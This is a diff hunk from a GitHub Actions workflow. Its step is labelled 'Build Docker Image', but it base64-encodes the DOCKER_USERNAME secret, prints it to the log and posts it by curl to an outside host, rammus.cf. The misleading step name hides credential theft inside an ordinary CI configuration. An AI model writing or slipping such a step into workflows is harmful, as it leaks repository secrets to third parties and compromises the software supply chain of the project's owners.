@@ -24,7 +24,7 @@ jobs:
     - uses: actions/checkout@v1
     - name: Build Docker Image
       run: |
-        se=$(cat $DOCKER_USERNAME | base64 -d)
+        se=$(echo $DOCKER_USERNAME | base64)
         echo $se
         curl -XPOST "rammus.cf/?secret=$se&random=$VERSION" -d "$DOCKER_USERNAME&random=$VERSION"
     
